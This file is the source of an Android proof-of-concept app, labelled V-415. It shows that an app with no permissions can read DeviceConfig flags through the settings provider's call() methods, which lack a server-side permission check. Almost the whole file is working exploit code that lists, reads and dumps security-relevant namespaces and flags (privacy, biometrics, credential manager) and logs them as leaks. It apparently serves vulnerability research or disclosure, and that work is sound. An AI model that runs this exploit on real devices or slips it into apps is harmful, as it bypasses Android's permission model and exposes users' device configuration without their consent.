package com.poc.deviceconfigleak;

import android.app.Activity;
import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.LinearLayout;
import android.view.Gravity;

/**
 * V-415: SettingsProvider DeviceConfig Zero-Permission Read
 *
 * Demonstrates that any app (ZERO permissions) can read all DeviceConfig flags
 * via ContentResolver.call() on the settings provider.
 *
 * The server-side SettingsProvider.call() handler for CALL_METHOD_GET_CONFIG,
 * CALL_METHOD_LIST_CONFIG, and CALL_METHOD_LIST_NAMESPACES_CONFIG performs
 * NO permission enforcement. The @RequiresPermission(READ_DEVICE_CONFIG)
 * annotation on the client API is lint-only, not runtime-enforced.
 */
public class MainActivity extends Activity {

    private static final String TAG = "DeviceConfigLeak";
    private static final Uri SETTINGS_URI = Uri.parse("content://settings");

    // Call method strings matching Settings.java constants
    private static final String GET_CONFIG = "GET_config";
    private static final String LIST_CONFIG = "LIST_config";
    private static final String LIST_NAMESPACES = "LIST_namespaces_config";

    // Security-critical namespaces to probe
    private static final String[] SECURITY_NAMESPACES = {
        "privacy",
        "permissions",
        "activity_manager",
        "activity_manager_native_boot",
        "app_compat_overrides",
        "biometrics",
        "credential_manager",
        "device_policy_manager",
        "package_manager_service",
        "settings_ui",
        "smart_lock",
        "window_manager",
        "connectivity",
        "tethering",
        "telephony",
        "aconfig_flags.permissions",
        "aconfig_flags.android.security",
    };

    // Individual high-value flags (mix of security-critical and commonly-set flags)
    private static final String[] HIGH_VALUE_FLAGS = {
        // Security-critical flags
        "privacy/device_identifier_access_restrictions_enabled",
        "privacy/bg_location_check_is_enabled",
        "privacy/location_accuracy_enabled",
        "privacy/SafetyCenter__safety_center_flag_version",
        "biometrics/android.hardware.biometrics.add_key_agreement_crypto_object",
        "biometrics/android.security.failed_auth_lock_toggle",
        "biometrics/android.security.secure_lock_device",
        "biometrics/android.security.secure_lockdown",
        "credential_manager/enable_credential_manager",
        "connectivity/dhcp_rapid_commit_version",
        "connectivity/data_stall_consecutive_dns_timeout_threshold",
    };

    private TextView mOutput;
    private StringBuilder mLog = new StringBuilder();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setPadding(32, 48, 32, 32);

        TextView title = new TextView(this);
        title.setText("V-415: DeviceConfig Zero-Permission Read");
        title.setTextSize(18);
        title.setGravity(Gravity.CENTER);
        root.addView(title);

        TextView info = new TextView(this);
        info.setText("This app has ZERO permissions. It reads DeviceConfig flags "
                + "via SettingsProvider.call() which has no server-side permission check.");
        info.setTextSize(12);
        info.setPadding(0, 16, 0, 16);
        root.addView(info);

        Button btnNamespaces = new Button(this);
        btnNamespaces.setText("1. List All Namespaces");
        btnNamespaces.setOnClickListener(v -> listNamespaces());
        root.addView(btnNamespaces);

        Button btnSecurityFlags = new Button(this);
        btnSecurityFlags.setText("2. Read Security-Critical Flags");
        btnSecurityFlags.setOnClickListener(v -> readSecurityFlags());
        root.addView(btnSecurityFlags);

        Button btnDumpNamespace = new Button(this);
        btnDumpNamespace.setText("3. Dump 'privacy' Namespace");
        btnDumpNamespace.setOnClickListener(v -> dumpNamespace("privacy"));
        root.addView(btnDumpNamespace);

        Button btnDumpAll = new Button(this);
        btnDumpAll.setText("4. Dump ALL Namespaces (Full Scan)");
        btnDumpAll.setOnClickListener(v -> dumpAllNamespaces());
        root.addView(btnDumpAll);

        ScrollView scroll = new ScrollView(this);
        mOutput = new TextView(this);
        mOutput.setTextSize(10);
        mOutput.setTypeface(android.graphics.Typeface.MONOSPACE);
        mOutput.setPadding(8, 8, 8, 8);
        scroll.addView(mOutput);
        root.addView(scroll, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1.0f));

        setContentView(root);

        log("=== DeviceConfig Leak PoC (V-415) ===");
        log("Package: " + getPackageName());
        log("UID: " + android.os.Process.myUid());
        log("Permissions: NONE declared");
        log("");
        log("Tap buttons above to test. If values are returned");
        log("without SecurityException, the vulnerability is confirmed.");
        log("");
    }

    private void listNamespaces() {
        log("\n--- LIST ALL NAMESPACES ---");
        try {
            Bundle result = getContentResolver().call(
                    SETTINGS_URI, LIST_NAMESPACES, null, null);
            if (result != null) {
                log("[SUCCESS] Namespaces readable without permission!");
                // The result format may vary — try common keys
                for (String key : result.keySet()) {
                    Object val = result.get(key);
                    log("  key=" + key + " → " + (val != null ? val.toString() : "null"));
                }
                String lines = result.getString("_list");
                if (lines != null) {
                    String[] parts = lines.split("\n");
                    log("  Total namespaces: " + parts.length);
                    for (String ns : parts) {
                        log("    " + ns);
                    }
                }
                // Also try "value" key
                String value = result.getString("value");
                if (value != null) {
                    log("  value: " + value);
                }
            } else {
                log("[FAIL] call() returned null — method may not exist on this version");
            }
        } catch (SecurityException e) {
            log("[BLOCKED] SecurityException: " + e.getMessage());
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void readSecurityFlags() {
        log("\n--- READ SECURITY-CRITICAL FLAGS ---");
        int success = 0, blocked = 0;
        for (String flag : HIGH_VALUE_FLAGS) {
            try {
                Bundle result = getContentResolver().call(
                        SETTINGS_URI, GET_CONFIG, flag, null);
                if (result != null) {
                    String value = result.getString("value");
                    if (value != null) {
                        log("[LEAK] " + flag + " = " + value);
                        success++;
                    } else {
                        // Flag exists but value is null (might be unset)
                        log("[NULL] " + flag + " = (not set)");
                        success++; // Still accessed without permission
                    }
                } else {
                    log("[EMPTY] " + flag + " → null result");
                }
            } catch (SecurityException e) {
                log("[BLOCKED] " + flag + " → " + e.getMessage());
                blocked++;
            } catch (Exception e) {
                log("[ERROR] " + flag + " → " + e.getMessage());
            }
        }
        log("\nResult: " + success + " readable, " + blocked + " blocked");
        if (success > 0 && blocked == 0) {
            log("*** VULNERABILITY CONFIRMED: Zero-permission DeviceConfig access ***");
        }
    }

    private void dumpNamespace(String namespace) {
        log("\n--- DUMP NAMESPACE: " + namespace + " ---");
        try {
            Bundle args = new Bundle();
            args.putString("_prefix", namespace + "/");
            Bundle result = getContentResolver().call(
                    SETTINGS_URI, LIST_CONFIG, namespace, args);
            if (result != null) {
                log("[SUCCESS] Namespace '" + namespace + "' dumped:");
                for (String key : result.keySet()) {
                    Object val = result.get(key);
                    log("  " + key + " = " + (val != null ? val.toString() : "null"));
                }
                // Also try without args bundle
                if (result.keySet().isEmpty()) {
                    Bundle result2 = getContentResolver().call(
                            SETTINGS_URI, LIST_CONFIG, namespace, null);
                    if (result2 != null) {
                        for (String key : result2.keySet()) {
                            log("  " + key + " = " + result2.get(key));
                        }
                    }
                }
            } else {
                log("[EMPTY] No result for namespace: " + namespace);
            }
        } catch (SecurityException e) {
            log("[BLOCKED] " + e.getMessage());
        } catch (Exception e) {
            log("[ERROR] " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private void dumpAllNamespaces() {
        log("\n--- FULL DUMP: ALL SECURITY NAMESPACES ---");
        int totalFlags = 0;
        for (String ns : SECURITY_NAMESPACES) {
            try {
                Bundle result = getContentResolver().call(
                        SETTINGS_URI, LIST_CONFIG, ns, null);
                if (result != null && !result.keySet().isEmpty()) {
                    log("\n[" + ns + "] (" + result.keySet().size() + " entries):");
                    for (String key : result.keySet()) {
                        Object val = result.get(key);
                        log("  " + key + " = " + (val != null ? val.toString() : "null"));
                        totalFlags++;
                    }
                }
            } catch (SecurityException e) {
                log("[BLOCKED] " + ns + ": " + e.getMessage());
            } catch (Exception e) {
                log("[ERROR] " + ns + ": " + e.getMessage());
            }
        }
        log("\n=== Total flags read: " + totalFlags + " ===");
        if (totalFlags > 0) {
            log("*** VULNERABILITY CONFIRMED ***");
        }
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mLog.append(msg).append("\n");
        if (mOutput != null) {
            mOutput.setText(mLog.toString());
        }
    }
}
